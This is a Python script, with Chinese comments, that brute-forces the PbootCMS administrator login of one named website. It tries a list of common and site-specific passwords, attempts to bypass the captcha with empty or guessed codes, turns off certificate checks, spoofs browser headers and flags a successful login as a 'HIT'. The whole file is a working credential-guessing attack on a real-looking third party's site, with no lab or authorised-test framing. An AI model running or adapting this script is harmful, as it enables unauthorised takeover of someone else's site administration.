#!/usr/bin/env python3
"""haitai_bf.py - haitaicasting PbootCMS后台爆破(验证码尝试绕过)"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://haitaicasting.com'
LOGIN = BASE + '/admin.php?p=/Index/login'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "pbootcms", "haitai123", "haitaicasting", "123456789"]

def try_login(opener, user, pw, code):
    data = urllib.parse.urlencode({'formcheck': '1', 'username': user, 'password': pw,
                                   'checkcode': code}).encode()
    try:
        req = urllib.request.Request(LOGIN, data=data,
                                     headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                              'Referer': LOGIN, 'X-Requested-With': 'XMLHttpRequest'})
        resp = opener.open(req, timeout=10)
        b = resp.read(15000).decode('utf-8', 'ignore')
        fu = resp.geturl()
        st = resp.status
    except urllib.error.HTTPError as e:
        st, b, fu = e.code, e.read(15000).decode('utf-8', 'ignore'), e.geturl()
    except Exception:
        return 'err'
    # 分析响应
    if '成功' in b or 'index' in fu.lower() and 'login' not in fu:
        return 'HIT'
    if '验证码' in b:
        return 'captcha'
    if '密码' in b or '错误' in b or '失败' in b:
        return 'pw'
    return 'other:' + b[:100]

def main():
    # 先测验证码是否可以绕过(空code)
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                         urllib.request.HTTPSHandler(context=ctx))
    # 试空验证码
    for pw in ['admin', 'admin123', '123456']:
        r = try_login(opener, 'admin', pw, '')
        print('admin/%s code=EMPTY: %s' % (pw, r), flush=True)
        if r == 'HIT':
            print('!!! HIT: admin/%s (empty captcha)' % pw, flush=True)
            sys.exit(0)
        if r != 'captcha':
            break
    print('---', flush=True)
    # 试固定验证码/常见值
    for code in ['1234', '0000', 'admin', 'test']:
        for pw in ['admin', 'admin123']:
            r = try_login(opener, 'admin', pw, code)
            print('admin/%s code=%s: %s' % (pw, code, r), flush=True)
            if r == 'HIT':
                print('!!! HIT: admin/%s code=%s' % (pw, code), flush=True)
                sys.exit(0)
    print('=== no easy bypass ===')

if __name__ == '__main__':
    main()
